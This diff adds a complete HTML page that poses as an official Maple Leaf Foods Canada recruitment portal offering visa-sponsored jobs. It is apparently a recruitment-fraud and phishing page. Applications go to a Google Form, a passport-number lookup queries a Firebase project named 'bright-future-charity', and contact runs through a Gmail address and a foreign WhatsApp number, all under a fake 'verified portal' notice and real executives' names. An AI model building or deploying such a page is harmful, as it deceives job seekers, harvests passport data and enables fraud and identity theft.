@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maple Leaf Food Canada | Official Recruitment Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    <style>
+        :root { --red: #C41230; --blue: #002d72; --dark-navy: #0f172a; --white: #ffffff; --bg-light: #f8fafc; --text-main: #1e293b; }
+        body { font-family: 'Inter', sans-serif; margin: 0; padding: 0; color: var(--text-main); line-height: 1.7; background-color: var(--bg-light); scroll-behavior: smooth; }
+        h1, h2, h3, h4 { font-family: 'Playfair Display', serif; }
+
+        header { padding: 15px 5%; background: var(--white); border-bottom: 4px solid var(--red); display: flex; align-items: center; min-height: 80px; }
+        .main-logo { max-width: 180px; height: auto; display: block; }
+
+        .hero-banner { width: 100%; height: 450px; background: url('banner.jpg') center/cover no-repeat; background-color: #e2e8f0; border-bottom: 5px solid var(--blue); }
+        
+        .action-zone { text-align: center; padding: 40px 0; background: white; }
+        .btn { display: inline-block; padding: 18px 45px; margin: 10px; border-radius: 4px; text-decoration: none; font-weight: 600; text-transform: uppercase; transition: 0.3s; cursor: pointer; border: none; }
+        .btn-apply { background: var(--red); color: white; }
+
+        .search-container { padding: 40px 10%; background: #f1f5f9; text-align: center; border-radius: 12px; margin: 20px 10%; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .search-input { padding: 15px; width: 100%; max-width: 300px; border: 2px solid var(--blue); border-radius: 4px; font-size: 16px; margin-bottom: 10px; outline: none; }
+        .btn-search { background: var(--blue); color: white; padding: 15px 40px; border-radius: 4px; font-weight: bold; cursor: pointer; border: none; }
+
+        .verification-card { background: white; border: 2px solid var(--blue); border-radius: 12px; padding: 30px; margin: 25px auto; text-align: left; display: none; border-left: 10px solid var(--red); box-shadow: 0 10px 20px rgba(0,0,0,0.1); max-width: 600px; }
+        .ver-header { border-bottom: 1px solid #eee; padding-bottom: 15px; margin-bottom: 15px; }
+        .ver-row { display: flex; justify-content: space-between; margin-bottom: 10px; }
+        .ver-label { font-weight: bold; color: #64748b; text-transform: uppercase; font-size: 0.8em; }
+        .ver-value { color: var(--dark-navy); font-weight: 600; }
+        .status-pill { padding: 5px 12px; border-radius: 20px; font-size: 0.85em; font-weight: 600; text-transform: uppercase; }
+        .status-Approved { background: #dcfce7; color: #166534; }
+        .status-Pending { background: #fef9c3; color: #854d0e; }
+        .status-Rejected { background: #fee2e2; color: #991b1b; }
+        .welcome-msg { background: #f0fdf4; color: #166534; padding: 15px; border-radius: 6px; margin-top: 20px; font-size: 0.95em; border: 1px solid #bbf7d0; line-height: 1.5; }
+
+        .team-growth { padding: 60px 10%; background: white; display: flex; align-items: center; gap: 40px; flex-wrap: wrap; }
+        .growth-text { flex: 1; min-width: 300px; }
+        .growth-img { flex: 1; min-width: 300px; border-radius: 8px; width: 100%; height: 350px; object-fit: cover; }
+
+        .vacancy-section { padding: 60px 10%; text-align: center; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; margin-top: 30px; }
+        .card { background: #fff; border: 1px solid #e2e8f0; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .card .img-box { width: 100%; height: 180px; background-color: #f8fafc; overflow: hidden; }
+        .card img { width: 100%; height: 100%; object-fit: cover; }
+        .card h3 { padding: 15px; font-size: 1em; color: var(--blue); background: #fdfdfd; margin: 0; }
+
+        .legacy-section { padding: 80px 10%; background: var(--blue); color: white; text-align: center; }
+        .legacy-img { width: 130px; height: 130px; border-radius: 50%; border: 4px solid var(--red); margin-bottom: 25px; object-fit: cover; background-color: #fff; display: inline-block; }
+        .quote { font-size: 1.8em; font-style: italic; max-width: 800px; margin: 0 auto 20px; color: #f1f5f9; }
+
+        .benefits-sector { padding: 80px 10%; background: #ffffff; }
+        .corporate-sector { padding: 80px 10%; background: #f8fafc; border-top: 1px solid #e2e8f0; }
+        .sector-title { text-align: center; color: var(--blue); margin-bottom: 50px; font-size: 2.2em; position: relative; padding-bottom: 15px; }
+        .sector-title::after { content: ''; width: 80px; height: 4px; background: var(--red); position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); }
+
+        .accordion-item { border: none; margin-bottom: 20px; border-radius: 8px; overflow: hidden; background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #edf2f7; }
+        .accordion-header { background: #ffffff; color: var(--dark-navy); padding: 24px 30px; cursor: pointer; font-weight: 600; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; border-left: 8px solid var(--red); font-size: 1.1em; }
+        .accordion-header:hover { background: #fcfcfc; color: var(--red); }
+        .accordion-content { padding: 0 35px; max-height: 0; overflow: hidden; transition: max-height 0.4s ease-out; }
+        .accordion-content div { padding: 25px 0; color: #4a5568; line-height: 1.9; font-size: 1em; border-top: 1px solid #f7fafc; }
+        .accordion-content strong { color: var(--blue); }
+
+        .leadership-section { padding: 60px 10%; background: #fff; text-align: center; }
+        .lead-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 25px; margin-top: 30px; }
+        .lead-card { background: #f8fafc; padding: 20px; border-radius: 12px; border: 1px solid #e2e8f0; }
+        .lead-img { width: 100%; height: 260px; object-fit: cover; border-radius: 8px; margin-bottom: 15px; }
+
+        .key-details { padding: 80px 10%; background: #ffffff; text-align: left; }
+        .details-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 40px; }
+        .detail-item h4 { color: var(--red); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px; font-size: 0.9em; }
+        .detail-item p { font-size: 0.95em; color: #4b5563; }
+
+        .security-alert { background: #fff1f2; color: #991b1b; padding: 25px; text-align: center; font-weight: 600; border-top: 3px solid var(--red); margin-top: 40px; }
+        .support-box { background: var(--dark-navy); padding: 60px 10%; text-align: center; color: white; }
+        .support-link { color: #fff; text-decoration: none; padding: 14px 28px; border: 1px solid #334155; border-radius: 6px; display: inline-block; margin: 10px; transition: 0.3s; background: rgba(255,255,255,0.05); }
+        .support-link:hover { background: var(--red); border-color: var(--red); }
+        
+        footer { background: #020617; color: #94a3b8; padding: 50px 10%; text-align: center; font-size: 0.9em; line-height: 1.6; }
+        .footer-vision { color: #f1f5f9; margin-bottom: 20px; font-style: italic; max-width: 700px; margin-left: auto; margin-right: auto; }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="logo.png" alt="Maple Leaf Foods" class="main-logo">
+</header>
+
+<div class="hero-banner"></div>
+
+<div class="action-zone">
+    <a href="https://docs.google.com/forms/d/e/1FAIpQLSdKiuuHhSZrvRwKVXCRBetkSh9UAyjiCmisLmiBHRnAQ_xXrg/viewform" target="_blank" class="btn btn-apply">Start Official Application</a>
+</div>
+
+<div id="status-check" class="search-container">
+    <h2 style="color: var(--blue);">Verify Application Status</h2>
+    <input type="text" id="passportBox" class="search-input" placeholder="Enter Passport Number...">
+    <br>
+    <button class="btn-search" onclick="checkStatus()">SEARCH RECORDS</button>
+    <div id="statusResult"></div>
+</div>
+
+<section class="team-growth">
+    <div class="growth-text">
+        <h2 style="color: var(--blue);">Excellence Through Diversity</h2>
+        <p>Maple Leaf Foods is dedicated to providing a world-class environment for our global workforce. We ensure every team member has the support, training, and resources required to excel in the Canadian food industry.</p>
+    </div>
+    <img src="https://images.unsplash.com/photo-1521737711867-e3b97375f902?q=80&w=2000" class="growth-img" alt="Professional Team">
+</section>
+
+<section class="vacancy-section">
+    <h2 style="color: var(--blue);">Open Global Roles</h2>
+    <div class="grid">
+        <div class="card"><div class="img-box"><img src="packing.jpg" alt=""></div><h3>1. Food Packing</h3></div>
+        <div class="card"><div class="img-box"><img src="delivery.jpg" alt=""></div><h3>2. Food Delivery</h3></div>
+        <div class="card"><div class="img-box"><img src="cleaning.jpg" alt=""></div><h3>3. Cleaning</h3></div>
+        <div class="card"><div class="img-box"><img src="driving.jpg" alt=""></div><h3>4. Driving</h3></div>
+        <div class="card"><div class="img-box"><img src="security.jpg" alt=""></div><h3>5. Security Guard</h3></div>
+        <div class="card"><div class="img-box"><img src="labour.jpg" alt=""></div><h3>6. Skilled Labour</h3></div>
+        <div class="card"><div class="img-box"><img src="picking.jpg" alt=""></div><h3>7. Food Picking</h3></div>
+    </div>
+</section>
+
+<section class="legacy-section">
+    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?q=80&w=500" class="legacy-img" alt="Executive Leadership">
+    <div class="quote">"Our mission is to be the most sustainable protein company on earth. That begins with a world-class recruitment standard."</div>
+    <p>— The McCain Family Legacy</p>
+</section>
+
+<section class="benefits-sector">
+    <h2 class="sector-title">Candidate Benefits Portfolio</h2>
+    <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion('b1')">Visa & 2-Year Work Permit <span>+</span></div>
+        <div id="b1" class="accordion-content"><div>All successful global applicants are eligible for a <strong>2-Year Canadian Work Permit</strong>. Our legal team handles all sponsorship documentation.</div></div>
+    </div>
+    <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion('b2')">Accommodation & Free Food <span>+</span></div>
+        <div id="b2" class="accordion-content"><div>We provide <strong>shared accommodation</strong> near the facility. Additionally, <strong>free duty meals</strong> are provided in the company cafeteria.</div></div>
+    </div>
+    <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion('b3')">Salary & Compensation Details <span>+</span></div>
+        <div id="b3" class="accordion-content"><div>Competitive hourly wages:
+            <ul>
+                <li><strong>Food Packing & Picking:</strong> $18.50 - $21.00 per hr</li>
+                <li><strong>Drivers & Delivery:</strong> $22.00 - $26.00 per hr</li>
+                <li><strong>Cleaning & Security:</strong> $17.00 - $19.50 per hr</li>
+                <li><strong>Skilled Labour:</strong> $24.00 - $30.00 per hr</li>
+            </ul>
+        </div></div>
+    </div>
+</section>
+
+<section class="corporate-sector">
+    <h2 class="sector-title">Corporate Governance & Ethics</h2>
+    <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion('c1')">Our 100 Year History & Heritage <span>+</span></div>
+        <div id="c1" class="accordion-content"><div>Founded in 1927, Maple Leaf Foods has grown into a global leader in the food industry. Over a century, we have built a reputation for <strong>stability, quality, and integrity</strong>. Joining our team means becoming part of a legacy that feeds millions of families across the world every single day.</div></div>
+    </div>
+    <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion('c2')">International Worker Rights <span>+</span></div>
+        <div id="c2" class="accordion-content"><div>We operate strictly under the <strong>Canadian Charter of Rights and Freedoms</strong>. Every international recruit is entitled to fair pay, a safe work environment, regulated working hours, and full health insurance coverage.</div></div>
+    </div>
+    <div class="accordion-item">
+        <div class="accordion-header" onclick="toggleAccordion('c3')">Privacy & Data Security Policy <span>+</span></div>
+        <div id="c3" class="accordion-content"><div>Your personal information, including passport and identification documents, is protected using <strong>high-level AES-256 encryption</strong>. We comply with the Personal Information Protection and Electronic Documents Act (PIPEDA).</div></div>
+    </div>
+</section>
+
+<section class="key-details">
+    <h2 style="color: var(--blue); text-align: center; margin-bottom: 50px;">Portal Key Information</h2>
+    <div class="details-grid">
+        <div class="detail-item">
+            <h4>Application Integrity</h4>
+            <p>All data submitted through this portal is encrypted and audited by our compliance department to maintain the highest standards of recruitment security.</p>
+        </div>
+        <div class="detail-item">
+            <h4>Immigration Compliance</h4>
+            <p>Maple Leaf Foods works in alignment with Employment and Social Development Canada (ESDC) to ensure all Labor Market Impact Assessments (LMIA) are filed accurately for international hires.</p>
+        </div>
+        <div class="detail-item">
+            <h4>Post-Recruitment Support</h4>
+            <p>Once verified, candidates are assigned a dedicated relocation officer to assist with embassy appointments, biometric scheduling, and travel logistics.</p>
+        </div>
+    </div>
+</section>
+
+<section class="leadership-section">
+    <h2 style="color: var(--blue);">Our Leadership Team</h2>
+    <div class="lead-grid">
+        <div class="lead-card"><img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?q=80&w=400" class="lead-img" alt=""><h4>Michael McCain</h4><p>Executive Chair</p></div>
+        <div class="lead-card"><img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?q=80&w=400" class="lead-img" alt=""><h4>Curtis Frank</h4><p>President & CEO</p></div>
+        <div class="lead-card"><img src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?q=80&w=400" class="lead-img" alt=""><h4>Geert Verellen</h4><p>CFO</p></div>
+    </div>
+</section>
+
+<div class="security-alert">
+    ⚠️ SECURITY NOTICE: This is the verified recruitment portal for Maple Leaf Foods. Protect your personal information by using only this official link.
+</div>
+
+<div class="support-box">
+    <h3>Corporate Liaison Office</h3>
+    <a href="mailto:mapleleaf.canada445@gmail.com" class="support-link">📧 mapleleaf.canada445@gmail.com</a>
+    <a href="https://wa.me/6289520225851" target="_blank" class="support-link">📲 Corporate WhatsApp Support</a>
+</div>
+
+<footer>
+    <p class="footer-vision">Maple Leaf Foods Inc. ("Maple Leaf Foods") is a carbon neutral company with a vision to be the most sustainable protein company on earth, responsibly producing food products under leading brands.</p>
+    <p>©2009–2026 Maple Leaf Foods. All rights reserved.</p>
+</footer>
+
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyCQodpZuUt44p1AYtvo9yqqzQqPYKf1_lI",
+    authDomain: "bright-future-charity.firebaseapp.com",
+    databaseURL: "https://bright-future-charity-default-rtdb.firebaseio.com",
+    projectId: "bright-future-charity",
+    storageBucket: "bright-future-charity.firebasestorage.app",
+    messagingSenderId: "1008624508644",
+    appId: "1:1008624508644:web:41baa1fba084d6b9c6d6f1"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  function checkStatus() {
+    const passport = document.getElementById('passportBox').value.trim();
+    const resultDiv = document.getElementById('statusResult');
+    if(!passport) { alert("Please enter Passport Number"); return; }
+    
+    resultDiv.innerHTML = "<p style='margin-top:20px; font-weight:bold;'>Querying Corporate Records Database...</p>";
+    
+    db.ref('applicants/' + passport).once('value', (snap) => {
+      if(snap.exists()) {
+        const data = snap.val();
+        const isApproved = data.status === "Approved";
+        resultDiv.innerHTML = `
+            <div class="verification-card" style="display:block;">
+                <div class="ver-header">
+                    <h3 style="margin:0; color:var(--blue);">Verification Result</h3>
+                    <small>Maple Leaf Foods Canada - Global Recruitment Division</small>
+                </div>
+                <div class="ver-row"><span class="ver-label">Candidate Name:</span><span class="ver-value">${data.name || 'Valued Applicant'}</span></div>
+                <div class="ver-row"><span class="ver-label">Document Reference:</span><span class="ver-value">${passport}</span></div>
+                <div class="ver-row"><span class="ver-label">Verification Status:</span><span class="status-pill status-${data.status}">${data.status}</span></div>
+                ${isApproved ? `<div class="welcome-msg"><strong>Verification Confirmed</strong><br>Congratulations ${data.name}, your credentials have been verified. Our HR Coordination team will reach out with your final offer and visa sponsorship guidelines shortly.</div>` : ''}
+            </div>`;
+      } else {
+        resultDiv.innerHTML = "<p style='color:red; margin-top:20px; font-weight:bold;'>NO RECORD FOUND. Please ensure the Passport Number is correct.</p>";
+      }
+    });
+  }
+
+  function toggleAccordion(id) {
+    const content = document.getElementById(id);
+    const header = content.previousElementSibling;
+    const icon = header.querySelector('span');
+    if (content.style.maxHeight) { content.style.maxHeight = null; icon.innerText = "+"; } 
+    else { content.style.maxHeight = content.scrollHeight + "px"; icon.innerText = "-"; }
+  }
+</script>
+</body>
+</html>
